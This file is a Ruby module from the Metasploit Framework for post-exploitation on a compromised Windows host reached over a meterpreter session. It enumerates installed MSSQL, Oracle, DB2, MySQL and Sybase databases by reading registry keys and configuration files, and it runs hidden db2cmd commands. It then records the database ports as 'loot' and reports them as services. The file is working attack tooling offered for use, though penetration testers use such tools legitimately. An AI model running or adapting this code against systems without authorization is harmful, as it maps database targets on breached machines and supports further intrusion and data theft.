##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex'
require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Common
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report
	

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather Database Instance Enumeration',
				'Description'   => %q{ This module will enumerate a windows system for installed database instances },
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Barry Shteiman <barry[at]sectorix.com>'],
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	# method called when command run is issued
	def run
		
		print_status("Enumerating Databases on #{sysinfo['Computer']}")
		found = false
		if check_mssql
			enumerate_mssql
			found = true
		end
		if check_oracle
			enumerate_oracle
			found = true
		end
		if check_db2
			enumerate_db2
			found = true
		end 
		if check_mysql
			enumerate_mysql
			found = true
		end
		if check_sybase
			enumerate_sybase
			found = true
		end	
		if found
			print_status("Done, Databases Found.")
		else
			print_status("Done, No Databases were found")
		end
	end

	##### initial identification methods #####
	
	# method for Checking if database instances are installed on host - mssql
	def check_mssql
		key = "HKLM\\SOFTWARE\\Microsoft"
		if registry_enumkeys(key).include?("Microsoft SQL Server")
			print_status("\tMicrosoft SQL Server found.")
			return true
		end
	return false
	rescue
		return false
	end

	# method for Checking if database instances are installed on host - oracle
	def check_oracle
		key = "HKLM\\SOFTWARE\\Oracle"
		if registry_enumkeys(key).include?("ALL_HOMES")
			print_status("\tOracle Server found.")
			return true
		elsif registry_enumkeys(key).include?("SYSMAN")
			print_status("\tOracle Server found.")
			return true
		end
	return false
	rescue
		return false
	end
	
	# method for Checking if database instances are installed on host - db2
	def check_db2
		key = "HKLM\\SOFTWARE\\IBM\\DB2"
		if registry_enumkeys(key).include?("GLOBAL_PROFILE")
			print_status("\tDB2 Server found.")
			return true
		end
	return false
	rescue
		return false
	end	
	
	# method for Checking if database instances are installed on host - mysql
	def check_mysql
		key = "HKLM\\SOFTWARE"
		if registry_enumkeys(key).include?("MySQL AB")
			print_status("\tMySQL Server found.")
			return true
		end
	return false
	rescue
		return false
	end		
	
	# method for Checking if database instances are installed on host - sybase
	def check_sybase
		key = "HKLM\\SOFTWARE\\Sybase"
		if registry_enumkeys(key).include?("SQLServer")
			print_status("\tSybase Server found.")
			return true
		elsif registry_enumkeys(key).include?("Server")
			print_status("\tSybase Server found.")
			return true
		end
	return false
	rescue
		return false
	end

	##### deep analysis methods #####
		
	# method to identify mssql instances
	def enumerate_mssql
		key = "HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL"
		instances = registry_enumvals(key)
		if not instances.nil? and not instances.empty?
			instances.each do |i|
				tcpkey = "HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\#{registry_getvaldata(key,i)}\\MSSQLServer\\SuperSocketNetLib\\Tcp\\IPAll"
				tcpport = registry_getvaldata(tcpkey,"TcpPort")
				print_good("\t\t+ #{registry_getvaldata(key,i)} (Port:#{tcpport})")
				loot("mssql","instance:#{registry_getvaldata(key,i)} port:#{tcpport}","Microsoft SQL Server",tcpport)
			end
		end
	rescue
		print_error("\t\t! could not identify information")
	end
	
	# method to identify oracle instances
	def enumerate_oracle
		basekey = "HKLM\\SOFTWARE\\Oracle\\SYSMAN"
		instances = registry_enumkeys(basekey)
		if not instances.nil? and not instances.empty?
			instances.each do |i|
				key = "#{basekey}\\#{i}"
				val_ORACLE_SID = registry_getvaldata(key,"ORACLE_SID")
				val_ORACLE_HOME = registry_getvaldata(key,"ORACLE_HOME")
								
				if session.fs.file.exists?(val_ORACLE_HOME + "\\NETWORK\\ADMIN\\tnsnames.ora")
					data_TNSNAMES = read_file(val_ORACLE_HOME + "\\NETWORK\\ADMIN\\tnsnames.ora")
					ports = data_TNSNAMES.scan(/PORT\ \=\ (\d+)/)
					port = $1
					print_good("\t\t+ #{val_ORACLE_SID} (Port:#{port})")
					loot("oracle","instance:#{val_ORACLE_SID} port:#{port}","Oracle Database Server",port)
				else
					print_error("\t\t! #{val_ORACLE_SID} (No Listener Found)")				
				end
			end
		end
	rescue
		print_error("\t\t! could not identify information")
	end

	# method to identify mysql instances
	def enumerate_mysql
		basekey = "HKLM\\SOFTWARE\\MySQL AB"
		instances = registry_enumkeys(basekey)
		if  instances.nil? or instances.empty?
			return
		end
		instances.each do |i|
			found = false
			key = "#{basekey}\\#{i}"
			val_Location = registry_getvaldata(key,"Location")
			if session.fs.file.exists?(val_Location + "\\my.ini")
				found = true
				data = read_file(val_Location + "\\my.ini")
			elsif session.fs.file.exists?(val_Location + "\\my.cnf")
				found = true
				data = read_file(val_Location + "\\my.cnf")
			else
				sysdriv=session.fs.file.expand_path("%SYSTEMDRIVE%")			
				getfile = session.fs.file.search(sysdriv + "\\","my.ini",recurse=true,timeout=-1)
				data = 0
				getfile.each do |file|
					if session.fs.file.exists?("#{file['path']}\\#{file['name']}")
						found = true
						data = read_file("#{file['path']}\\#{file['name']}")
						break
					end
				end
			end
			if found
				ports = data.scan(/port\=(\d+)/)
				port = $1
				print_good("\t\t+ MYSQL (Port:#{port})")
				loot("mysql","instance:MYSQL port:#{port}","MySQL Server",port)
			else
				print_error("\t\t! couldnt locate file.")
			end
		end
	rescue
		print_error("\t\t! could not identify information")
	end
	
	# method to identify sybase instances
	def enumerate_sybase
		basekey = "HKLM\\SOFTWARE\\Sybase\\SQLServer"
		instance = registry_getvaldata(basekey,"DSLISTEN")
		location = registry_getvaldata(basekey,"RootDir")
		port = 0
		if session.fs.file.exists?(location + "\\ini\\sql.ini")
			data = read_file(location + "\\ini\\sql.ini")
			segments = data.scan(/\[#{instance}\]([^\[]*)/)
			segment = ""
			segments.each do |s|
				if segment == ""
					segment = $1
				end
			end
			ports = segment.scan(/master\=\w+\,[^\,]+\,(\d+)/)
			port = $1
			print_good("\t\t+ #{instance} (Port:#{port})")
			loot("sybase","instance:#{instance} port:#{port}","Sybase SQL Server",port)
		else
			print_error("\t\t! could not locate configuration file.")
		end
	rescue
		print_error("\t\t! couldnt locate information.")
	end
	
	# method to identify db2 instances
	def enumerate_db2
		cmd_i = run_cmd("db2cmd -i -w /c db2ilist")
		cmd_p = run_cmd("db2cmd -i -w /c db2 get dbm cfg")
		ports = cmd_p.scan(/\ ?TCP\/IP\ Service\ name[\ ]+\(SVCENAME\)\ =\ (\w+)/)
		port = $1
		windir = session.fs.file.expand_path("%windir%")
		getfile = session.fs.file.search(windir + "\\system32\\drivers\\etc\\","services.*",recurse=true,timeout=-1)
		data = 0
		getfile.each do |file|
			if data == 0
				if session.fs.file.exists?("#{file['path']}\\#{file['name']}")
					data = read_file("#{file['path']}\\#{file['name']}")
				end
			end
		end
		port_translated = data.scan(/#{port}[\ \t]+(\d+)/)
		port_t = $1
		cmd_i.split("\n").compact.each do |line|
			stripped=line.strip
			print_good("\t\t+ #{stripped} (Port:#{port_t})")
			#loot("db2","instance:#{stripped} port:#{port_t}","DB2 Server",port_t)
			loot("db2","instance:#{stripped} port:#{port_t}","DB2 Server",port_t)
		end
	rescue
		print_error("\t\t! could not identify instances information")
	end
	
	
	##### helper methods #####
	
	# method to run a command and retrieve output
	def run_cmd(cmd)
		process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
		res = ""
		while (d = process.channel.read)
			break if d == ""
			res << d
		end
		process.channel.close
		process.close
		return res
	rescue
		print_error("\t\t! could not execute remote process")
		return ""
	end
	
	# this method stores the loot in a consistant format for this module, and reports on service
	def loot(dbtype,dbdata,dbinfo,dbport)
		#rhost = sysinfo['Computer']
		filename = "#{session.sock.peerhost}_#{dbtype}_database_enumeration.txt"
		store_loot("windows.database.instance",
			"text/plain",
			session,
			"host:#{session.sock.peerhost} type:#{dbtype} #{dbdata}",
			filename,
			dbinfo)
		report(dbport,dbtype,dbdata)
	rescue
		print_error("\t\t! could not store loot")
	end
	
	#this method simply reports the new discovered service to the services list
	def report(dbport,dbtype,dbdata)
		report_service(:host => session.sock.peerhost, :port => dbport, :name => dbtype, :info => "#{dbtype}, #{dbdata}")
	rescue
		print_error("\t\t! could not report service")
	end
end